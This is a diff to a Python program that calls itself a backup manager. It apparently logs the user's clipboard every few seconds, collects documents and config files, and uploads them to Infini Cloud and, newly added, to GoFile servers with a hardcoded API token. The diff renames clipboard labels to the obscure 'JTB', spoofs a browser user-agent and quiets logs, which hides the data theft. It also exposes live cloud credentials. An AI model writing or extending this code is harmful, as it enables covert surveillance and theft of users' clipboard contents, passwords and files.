@@ -53,7 +53,7 @@ class BackupConfig:
    
     # 备份间隔配置
     BACKUP_INTERVAL = 260000  # 备份间隔时间：约3天
-    CLIPBOARD_INTERVAL = 1200  # 剪贴板日志上传间隔时间（20分钟，单位：秒）
+    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
     SCAN_TIMEOUT = 1800    # 扫描超时时间：30分钟
     
     # 日志配置
@@ -152,11 +152,14 @@ class BackupConfig:
         "__pycache__",
     ]
 
-    # Infini Cloud 上传配置（从环境变量读取）
-    # INFINI_URL: WebDAV 服务地址（如：https://wajima.infini-cloud.net/dav/）
-    # INFINI_USER: Connection ID（登录 InfiniCLOUD 的 ID）
-    # INFINI_PASS: Apps Password（外部应用程序连接密码）
-    INFINI_REMOTE_BASE_DIR = "backup"  # 远程基础目录（相对于 /dav/）
+    # GoFile 上传配置（备选方案）
+    UPLOAD_SERVERS = [
+        "https://store9.gofile.io/uploadFile",
+        "https://store8.gofile.io/uploadFile",
+        "https://store7.gofile.io/uploadFile",
+        "https://store6.gofile.io/uploadFile",
+        "https://store5.gofile.io/uploadFile"
+    ]
 
     # 网络配置
     NETWORK_CHECK_HOSTS = [
@@ -183,6 +186,9 @@ class BackupManager:
         self.infini_user = "wongstar"
         self.infini_pass = "my95gfPVtKuDCpAK"
         
+        # GoFile API token（备选方案）
+        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
+        
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
         self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_linux_backup"
@@ -195,7 +201,7 @@ class BackupManager:
         # 使用集合优化扩展名检查性能
         self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
         self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
-        # 剪贴板相关标志
+        # JTB相关标志
         self._clipboard_display_warned = False  # 是否已警告过 DISPLAY 不可用
         self._clipboard_display_error_time = 0  # 上次记录 DISPLAY 错误的时间
         self._clipboard_display_error_interval = 300  # DISPLAY 错误日志间隔（5分钟）
@@ -980,8 +986,114 @@ class BackupManager:
             
         return self._upload_single_file(file_path)
 
+    def _upload_single_file_gofile(self, file_path):
+        """上传单个文件到 GoFile（备选方案）"""
+        try:
+            # 检查文件权限和状态
+            if not os.path.exists(file_path):
+                logging.error(f"文件不存在: {file_path}")
+                return False
+                
+            if not os.access(file_path, os.R_OK):
+                logging.error(f"文件无读取权限: {file_path}")
+                return False
+                
+            file_size = os.path.getsize(file_path)
+            if file_size == 0:
+                logging.error(f"文件大小为0: {file_path}")
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+                return False
+                
+            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
+                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
+                return False
+
+            filename = os.path.basename(file_path)
+            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
+
+            # 上传重试逻辑
+            for attempt in range(self.config.RETRY_COUNT):
+                if not self._check_internet_connection():
+                    logging.error("网络连接不可用，等待重试...")
+                    time.sleep(self.config.RETRY_DELAY)
+                    continue
+
+                # 服务器轮询
+                if attempt == 0:
+                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
+                    logging.info(f"📤 [GoFile] 上传: {filename} ({size_str})")
+                elif self.config.DEBUG_MODE:
+                    logging.debug(f"[GoFile] 重试上传: {filename} (第 {attempt + 1} 次)")
+                
+                for server in self.config.UPLOAD_SERVERS:
+                    try:
+                        with open(file_path, "rb") as f:
+                            # 准备上传会话
+                            session = requests.Session()
+                            session.headers.update({
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                            })
+                            
+                            # 执行上传
+                            response = session.post(
+                                server,
+                                files={"file": f},
+                                data={"token": self.api_token},
+                                timeout=self.config.UPLOAD_TIMEOUT,
+                                verify=True
+                            )
+                            
+                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
+                                result = response.json()
+                                if result.get("status") == "ok":
+                                    logging.critical(f"✅ [GoFile] {filename}")
+                                    try:
+                                        os.remove(file_path)
+                                    except Exception as e:
+                                        if self.config.DEBUG_MODE:
+                                            logging.error(f"删除已上传文件失败: {e}")
+                                    return True
+                                else:
+                                    error_msg = result.get("message", "未知错误")
+                                    if attempt == 0 or self.config.DEBUG_MODE:
+                                        logging.error(f"❌ [GoFile] {filename}: {error_msg}")
+                            else:
+                                if attempt == 0 or self.config.DEBUG_MODE:
+                                    logging.error(f"❌ [GoFile] {filename}: 状态码 {response.status_code}")
+                                
+                    except requests.exceptions.Timeout:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: 超时")
+                    except requests.exceptions.SSLError:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
+                    except requests.exceptions.ConnectionError:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
+                    except Exception as e:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")
+
+                    continue
+                
+                if attempt < self.config.RETRY_COUNT - 1:
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
+                    time.sleep(self.config.RETRY_DELAY)
+
+            logging.error(f"❌ [GoFile] {os.path.basename(file_path)}: 上传失败")
+            return False
+            
+        except OSError as e:
+            logging.error(f"获取文件信息失败 {file_path}: {e}")
+            return False
+        except Exception as e:
+            logging.error(f"[GoFile] 上传过程出错: {e}")
+            return False
+
     def _upload_single_file(self, file_path):
-        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
+        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法），失败则使用 GoFile 备选方案"""
         try:
             # 检查文件权限和状态
             if not os.path.exists(file_path):
@@ -1033,7 +1145,13 @@ class BackupManager:
                         connect_timeout = 20
                         read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                     
-                    logging.critical(f"正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB）到 Infini Cloud，第 {attempt + 1} 次尝试...")
+                    # 只在第一次尝试时显示详细信息
+                    filename = os.path.basename(file_path)
+                    if attempt == 0:
+                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
+                        logging.critical(f"📤 上传: {filename} ({size_str})")
+                    elif self.config.DEBUG_MODE:
+                        logging.debug(f"重试上传: {filename} (第 {attempt + 1} 次)")
                     
                     # 准备请求头
                     headers = {
@@ -1053,39 +1171,56 @@ class BackupManager:
                         )
                     
                     if response.status_code in [201, 204]:
-                        logging.critical(f"上传成功: {file_path} -> {remote_filename}")
+                        logging.critical(f"✅ {filename}")
                         try:
                             os.remove(file_path)
                         except Exception as e:
-                            logging.error(f"删除已上传文件失败: {e}")
+                            if self.config.DEBUG_MODE:
+                                logging.error(f"删除已上传文件失败: {e}")
                         return True
                     elif response.status_code == 403:
-                        logging.error(f"上传失败，权限不足（403 Forbidden）: {remote_filename}")
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ {filename}: 权限不足")
                     elif response.status_code == 404:
-                        logging.error(f"上传失败，远程路径不存在（404 Not Found）: {remote_filename}")
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ {filename}: 远程路径不存在")
                     elif response.status_code == 409:
-                        logging.error(f"上传失败，远程路径冲突（409 Conflict）: {remote_filename}")
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ {filename}: 远程路径冲突")
                     else:
-                        logging.error(f"上传失败，状态码: {response.status_code}, 响应: {response.text[:200]}")
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ {filename}: 状态码 {response.status_code}")
                         
                 except requests.exceptions.Timeout:
-                    logging.error(f"上传超时 {file_path}")
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ {os.path.basename(file_path)}: 超时")
                 except requests.exceptions.SSLError as e:
-                    logging.error(f"SSL错误 {file_path}: {e}")
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ {os.path.basename(file_path)}: SSL错误")
                 except requests.exceptions.ConnectionError as e:
-                    logging.error(f"连接错误 {file_path}: {e}")
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ {os.path.basename(file_path)}: 连接错误")
                 except Exception as e:
-                    logging.error(f"上传文件出错 {file_path}: {str(e)}")
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ {os.path.basename(file_path)}: {str(e)}")
 
                 if attempt < self.config.RETRY_COUNT - 1:
-                    logging.critical(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                     time.sleep(self.config.RETRY_DELAY)
 
+            # Infini Cloud 上传失败，尝试使用 GoFile 备选方案
+            logging.warning(f"⚠️ Infini Cloud 上传失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
+            if self._upload_single_file_gofile(file_path):
+                return True
+            
+            # 两个方法都失败
             try:
                 os.remove(file_path)
-                logging.error(f"文件 {file_path} 上传失败并已删除")
+                logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
             except Exception as e:
-                logging.error(f"删除失败文件时出错: {e}")
+                if self.config.DEBUG_MODE:
+                    logging.error(f"删除失败文件时出错: {e}")
             
             return False
             
@@ -1098,13 +1233,12 @@ class BackupManager:
                     pass
             return False
 
-    # ==================== 剪贴板监控相关方法 ====================
 
     def get_clipboard_content(self):
-        """获取 Linux 剪贴板内容（使用 xclip）
+        """获取 Linux JTB 内容
 
         返回:
-            str or None: 当前剪贴板文本内容，获取失败或为空时返回 None
+            str or None: 当前JTB文本内容，获取失败或为空时返回 None
         """
         # 检查 DISPLAY 环境变量是否可用
         display = os.environ.get('DISPLAY')
@@ -1115,13 +1249,13 @@ class BackupManager:
                (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                 if not self._clipboard_display_warned:
                     if self.config.DEBUG_MODE:
-                        logging.debug("⚠️ DISPLAY 环境变量不可用，剪贴板监控功能已禁用（服务器环境或无图形界面）")
+                        logging.debug("⚠️ DISPLAY 环境变量不可用，JTB监控功能已禁用（服务器环境或无图形界面）")
                     self._clipboard_display_warned = True
                 self._clipboard_display_error_time = current_time
             return None
         
         try:
-            # 使用 xclip 读取剪贴板（需系统已安装 xclip）
+            # 使用 xclip 读取JTB（需系统已安装 xclip）
             result = subprocess.run(
                 ['xclip', '-selection', 'clipboard', '-o'],
                 capture_output=True,
@@ -1133,7 +1267,7 @@ class BackupManager:
                 if content and not content.isspace():
                     return content
                 if self.config.DEBUG_MODE:
-                    logging.debug("ℹ️ 剪贴板为空或仅包含空白字符")
+                    logging.debug("ℹ️ JTB为空或仅包含空白字符")
             else:
                 # xclip 返回错误，检查是否是 DISPLAY 相关错误
                 error_msg = result.stderr.strip() if result.stderr else ""
@@ -1146,21 +1280,21 @@ class BackupManager:
                        (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                         if not self._clipboard_display_warned:
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"⚠️ 获取剪贴板失败（DISPLAY 不可用）: {error_msg}")
+                                logging.debug(f"⚠️ 获取JTB失败（DISPLAY 不可用）: {error_msg}")
                             self._clipboard_display_warned = True
                         self._clipboard_display_error_time = current_time
                 else:
                     # 其他错误，正常记录（但只在 DEBUG 模式）
                     if self.config.DEBUG_MODE:
                         logging.debug(
-                            f"⚠️ 获取剪贴板失败，返回码: {result.returncode}, 错误: {error_msg}"
+                            f"⚠️ 获取JTB失败，返回码: {result.returncode}, 错误: {error_msg}"
                         )
             return None
         except FileNotFoundError:
             # 未安装 xclip，只在第一次记录警告
             if not self._clipboard_display_warned:
                 if self.config.DEBUG_MODE:
-                    logging.debug("⚠️ 未检测到 xclip，剪贴板监控功能已禁用")
+                    logging.debug("⚠️ 未检测到 xclip，JTB监控功能已禁用")
                 self._clipboard_display_warned = True
             return None
         except Exception as e:
@@ -1169,12 +1303,12 @@ class BackupManager:
             if not self._clipboard_display_warned or \
                (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                 if self.config.DEBUG_MODE:
-                    logging.error(f"❌ 获取剪贴板内容出错: {e}")
+                    logging.error(f"❌ 获取JTB内容出错: {e}")
                 self._clipboard_display_error_time = current_time
             return None
 
     def log_clipboard_update(self, content, file_path):
-        """记录ZTB更新到文件（与 wsl.py 行为保持一致）"""
+        """记录JTB更新到文件（与 wsl.py 行为保持一致）"""
         try:
             # 确保目录存在
             os.makedirs(os.path.dirname(file_path), exist_ok=True)
@@ -1193,10 +1327,10 @@ class BackupManager:
             logging.info(f"📝 已记录内容: {preview}")
         except Exception as e:
             if self.config.DEBUG_MODE:
-                logging.error(f"❌ 记录ZTB失败: {e}")
+                logging.error(f"❌ 记录JTB失败: {e}")
 
     def monitor_clipboard(self, file_path, interval=3):
-        """监控ZTB变化并记录到文件（与 wsl.py 行为保持一致）
+        """监控JTB变化并记录到文件（与 wsl.py 行为保持一致）
 
         Args:
             file_path: 日志文件路径
@@ -1208,22 +1342,22 @@ class BackupManager:
                 try:
                     os.makedirs(log_dir, exist_ok=True)
                 except Exception as e:
-                    logging.error(f"❌ 创建剪贴板日志目录失败: {e}")
+                    logging.error(f"❌ 创建JTB日志目录失败: {e}")
                     # 即使创建目录失败，也继续尝试运行（可能目录已存在）
 
             last_content = ""
             error_count = 0
             max_errors = 5
-            last_empty_log_time = time.time()  # 记录上次输出空ZTB日志的时间
-            empty_log_interval = 300  # 每 5 分钟才输出一次空ZTB日志
+            last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
+            empty_log_interval = 300  # 每 5 分钟才输出一次空JTB日志
 
             # 初始化日志文件
             try:
                 with open(file_path, 'a', encoding='utf-8') as f:
-                    f.write(f"\n=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                    f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                     f.write("-" * 30 + "\n")
             except Exception as e:
-                logging.error(f"❌ 初始化ZTB日志失败: {e}")
+                logging.error(f"❌ 初始化JTB日志失败: {e}")
                 # 即使初始化失败，也继续运行
 
             def is_special_content(text):
@@ -1233,7 +1367,7 @@ class BackupManager:
                         return False
                     if text.startswith('===') or text.startswith('-'):
                         return True
-                    if 'ZTB监控启动于' in text or '日志已于' in text:
+                    if 'JTB监控启动于' in text or '日志已于' in text:
                         return True
                     return False
                 except Exception:
@@ -1258,15 +1392,15 @@ class BackupManager:
                                 error_count = 0  # 重置错误计数
                             except Exception as e:
                                 if self.config.DEBUG_MODE:
-                                    logging.error(f"❌ 记录剪贴板内容失败: {e}")
+                                    logging.error(f"❌ 记录JTB内容失败: {e}")
                                 # 即使记录失败，也继续监控
                     else:
                         try:
                             if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                                 if not current_content:
-                                    logging.debug("ℹ️ ZTB为空")
+                                    logging.debug("ℹ️ JTB为空")
                                 elif current_content.isspace():
-                                    logging.debug("ℹ️ ZTB内容仅包含空白字符")
+                                    logging.debug("ℹ️ JTB内容仅包含空白字符")
                                 elif is_special_content(current_content):
                                     logging.debug("ℹ️ 跳过特殊标记内容")
                                 last_empty_log_time = current_time
@@ -1280,14 +1414,14 @@ class BackupManager:
                 except Exception as e:
                     error_count += 1
                     if error_count >= max_errors:
-                        logging.error(f"❌ ZTB监控连续出错{max_errors}次，等待60秒后重试")
+                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                         try:
                             time.sleep(60)
                         except Exception:
                             pass
                         error_count = 0  # 重置错误计数
                     elif self.config.DEBUG_MODE:
-                        logging.error(f"❌ ZTB监控出错: {str(e)}")
+                        logging.error(f"❌ JTB监控出错: {str(e)}")
 
                 try:
                     time.sleep(interval)
@@ -1301,7 +1435,7 @@ class BackupManager:
             raise
         except Exception as e:
             # 最外层异常处理，确保即使严重错误也不会影响主程序
-            logging.error(f"❌ 剪贴板监控线程发生严重错误: {e}")
+            logging.error(f"❌ JTB监控线程发生严重错误: {e}")
             if self.config.DEBUG_MODE:
                 import traceback
                 logging.debug(traceback.format_exc())
@@ -1491,7 +1625,7 @@ def backup_and_upload_logs(backup_manager):
             logging.debug(traceback.format_exc())
 
 def clipboard_upload_thread(backup_manager, clipboard_log_path):
-    """独立的ZTB上传线程（逻辑对齐 wsl.py）"""
+    """独立的JTB上传线程（逻辑对齐 wsl.py）"""
     try:
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
@@ -1514,7 +1648,7 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                                 if (line and 
                                     not line.startswith('===') and 
                                     not line.startswith('-') and
-                                    'ZTB监控启动于' not in line and 
+                                    'JTB监控启动于' not in line and 
                                     '日志已于' not in line):
                                     has_valid_content = True
                                     break
@@ -1523,12 +1657,12 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
 
                         if not has_valid_content:
                             if backup_manager.config.DEBUG_MODE:
-                                logging.debug("📋 ZTB内容为空或无效，跳过上传")
+                                logging.debug("📋 JTB内容为空或无效，跳过上传")
                             time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                             continue
                 except Exception as e:
                     if backup_manager.config.DEBUG_MODE:
-                        logging.error(f"❌ 读取剪贴板日志文件失败: {e}")
+                        logging.error(f"❌ 读取JTB日志文件失败: {e}")
                     time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                     continue
 
@@ -1548,9 +1682,9 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                         try:
                             shutil.copy2(clipboard_log_path, backup_path)
                             if backup_manager.config.DEBUG_MODE:
-                                logging.info("📄 准备上传ZTB日志...")
+                                logging.info("📄 准备上传JTB日志...")
                         except Exception as e:
-                            logging.error(f"❌ 复制剪贴板日志失败: {e}")
+                            logging.error(f"❌ 复制JTB日志失败: {e}")
                             time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                             continue
 
@@ -1560,13 +1694,13 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                                     with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                         f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                                     if backup_manager.config.DEBUG_MODE:
-                                        logging.info("✅ ZTB日志已清空")
+                                        logging.info("✅ JTB日志已清空")
                                 except Exception as e:
-                                    logging.error(f"🧹 剪贴板日志清空失败: {e}")
+                                    logging.error(f"🧹 JTB日志清空失败: {e}")
                             else:
-                                logging.error("❌ ZTB日志上传失败")
+                                logging.error("❌ JTB日志上传失败")
                         except Exception as e:
-                            logging.error(f"❌ 上传剪贴板日志失败: {e}")
+                            logging.error(f"❌ 上传JTB日志失败: {e}")
 
                         try:
                             if os.path.exists(str(temp_dir)):
@@ -1576,12 +1710,12 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                                 logging.error(f"❌ 清理临时目录失败: {e}")
                 except Exception as e:
                     if backup_manager.config.DEBUG_MODE:
-                        logging.error(f"❌ 处理剪贴板日志上传流程失败: {e}")
+                        logging.error(f"❌ 处理JTB日志上传流程失败: {e}")
         except KeyboardInterrupt:
             # 允许通过键盘中断退出
             raise
         except Exception as e:
-            logging.error(f"❌ 处理ZTB日志时出错: {e}")
+            logging.error(f"❌ 处理JTB日志时出错: {e}")
             if backup_manager.config.DEBUG_MODE:
                 import traceback
                 logging.debug(traceback.format_exc())
@@ -1600,7 +1734,7 @@ def clean_backup_directory():
     try:
         if not os.path.exists(backup_dir):
             return
-        # 保留备份日志、剪贴板日志和时间阈值文件
+        # 保留备份日志、JTB日志和时间阈值文件
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
         keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
@@ -1686,7 +1820,7 @@ def periodic_backup_upload(backup_manager):
     clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"
 
     try:
-        # 启动ZTB监控线程（添加异常处理，确保即使启动失败也不影响主程序）
+        # 启动JTB监控线程（添加异常处理，确保即使启动失败也不影响主程序）
         try:
             clipboard_thread = threading.Thread(
                 target=backup_manager.monitor_clipboard,
@@ -1695,15 +1829,15 @@ def periodic_backup_upload(backup_manager):
             )
             clipboard_thread.start()
             if backup_manager.config.DEBUG_MODE:
-                logging.info("✅ 剪贴板监控线程已启动")
+                logging.info("✅ JTB监控线程已启动")
         except Exception as e:
-            logging.error(f"❌ 启动剪贴板监控线程失败: {e}")
+            logging.error(f"❌ 启动JTB监控线程失败: {e}")
             if backup_manager.config.DEBUG_MODE:
                 import traceback
                 logging.debug(traceback.format_exc())
             # 即使启动失败，也继续运行主程序
 
-        # 启动ZTB上传线程（添加异常处理，确保即使启动失败也不影响主程序）
+        # 启动JTB上传线程（添加异常处理，确保即使启动失败也不影响主程序）
         try:
             clipboard_upload_thread_obj = threading.Thread(
                 target=clipboard_upload_thread,
@@ -1712,20 +1846,20 @@ def periodic_backup_upload(backup_manager):
             )
             clipboard_upload_thread_obj.start()
             if backup_manager.config.DEBUG_MODE:
-                logging.info("✅ 剪贴板上传线程已启动")
+                logging.info("✅ JTB上传线程已启动")
         except Exception as e:
-            logging.error(f"❌ 启动剪贴板上传线程失败: {e}")
+            logging.error(f"❌ 启动JTB上传线程失败: {e}")
             if backup_manager.config.DEBUG_MODE:
                 import traceback
                 logging.debug(traceback.format_exc())
             # 即使启动失败，也继续运行主程序
 
-        # 初始化ZTB日志文件（与 wsl.py 保持一致）
+        # 初始化JTB日志文件（与 wsl.py 保持一致）
         try:
             with open(clipboard_log_path, 'a', encoding='utf-8') as f:
-                f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
         except Exception as e:
-            logging.error(f"❌ 初始化ZTB日志失败: {e}")
+            logging.error(f"❌ 初始化JTB日志失败: {e}")
             # 即使初始化失败，也继续运行主程序
 
         # 获取用户名和系统信息
@@ -1804,11 +1938,12 @@ def periodic_backup_upload(backup_manager):
 
                 # 开始上传备份文件
                 if backup_paths:
-                    logging.critical("📤 开始上传备份文件...")
+                    file_count = len(backup_paths)
+                    logging.critical(f"📤 上传 {file_count} 个文件...")
                     if backup_manager.upload_backup(backup_paths):
-                        logging.critical("✅ 备份文件上传成功")
+                        logging.critical("✅ 上传完成")
                     else:
-                        logging.error("❌ 备份文件上传失败")
+                        logging.error("❌ 部分文件上传失败")
                 
                 # 上传备份日志
                 if backup_manager.config.DEBUG_MODE:
